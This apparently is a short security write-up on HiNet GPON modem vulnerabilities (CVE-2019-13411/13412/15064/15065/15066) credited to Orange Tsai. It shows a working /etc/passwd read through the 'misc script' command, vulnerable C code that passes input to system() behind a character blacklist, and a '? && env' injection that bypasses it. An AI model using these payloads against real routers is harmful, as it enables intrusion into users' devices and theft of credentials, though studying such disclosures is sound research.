## Covering HiNet GPON RCE from Orange Tsai
List of CVE :
* CVE-2019-13411
* CVE-2019-13412
* CVE-2019-15064
* CVE-2019-15065
* CVE-2019-15066

Btw orange just disclose the technique/walkthrough on CVE-2019-15065, CVE-2019-13411 and CVE-2019-13412!<br>
Rest of them i will try to explain with my little experience.<br>

### CVE-2019-15065 & CVE-2019-13412 (Arbitrary Read Files)
So basically there's a feature for execute shell script through files inside gpon machine. However if<br>
__the file is not__ a normal shell script, it will output the content with STDERR.
```bash
xxxx:xxx:xxx> misc script /etc/passwd
passwd> root:<redacted>:0:0:root:/root:/etc/init.d/login.sh
Invalid command.
passwd> support:<redacted>:0:0:root:/root:/etc/init.d/login.sh
Invalid command.
passwd> admin:x:0:0:root:/root:/etc/init.d/login.sh
Invalid command.
passwd> user:<redacted>:0:0:root:/root:/etc/init.d/login.sh
Invalid command.
passwd> ftp:*:95:95::/var/ftp:
Invalid command.
passwd> nobody:x:506:507:::
Invalid command.
passwd> sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
Invalid command.
xxxx:xxx:xxx> 
```

### HiNET GPON on port 3097
Like other modem/router device, there's shortcut command for spawn help menu/list with command "?".<br>
This is snippet line of code that provide function for command "?" :
```c
  char * BLACKLISTS = "|<>(){}`;" ;                     // <--- blacklist char prevent command injection
  char *input = util_trim(s1);                          // <--- our input
  if (input[0] == '\0' || input[0] == '#')          
      return 0;

  while (SUB_COMMAND_LIST[i] != 0) {
      sub_cmd = SUB_COMMAND_LIST[i++];
      if (strncmp(input, sub_cmd, strlen(sub_cmd)) == 0)
          break;
  }
  
  if (SUB_COMMAND_LIST[i] == 0 && strchr(input, '?') == 0)
      return -10;
      
  // ...<snip>...
  
  while (BLACKLISTS[i] != 0) {
      if (strchr(input, BLACKLISTS[i]) != 0) {
          util_fdprintf(fd, "invalid char '%c' in command\n", BLACKLISTS[i]);   // prompt if blacklist char exist!
          return -1;
      }
      i++;
  }
  
  snprintf(file_buf,  64, "/tmp/tmpfile.%d.%06ld", getpid(), random() % 1000000);
  snprintf(cmd_buf, 1024, "/usr/bin/diag %s > %s 2>/dev/null", input, file_buf);
  system(cmd_buf);
```
As you can see, our input after "?" got parsed if contains blacklist char. To bypass it we can use char "&" :p<br>
![alt text](https://devco.re/assets/img/blog/20191111/7.png "Bypass with &")
```bash
xxxx:xxx:xxx> ? && env       # bypass parser :v
active=1
SHLVL=8
HOME=/
OLDPWD=/
TERM=vt102
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/etc/init.d:/etc/bin
SHELL=/bin/sh
PWD=/tmp
```

### HiNET GPON on port 6998
<pre>p0c not free, just kidding :p</pre>
<br>

##### Credits & Thx for :
* [@OrangeTsai](https://github.com/chjj/marked)
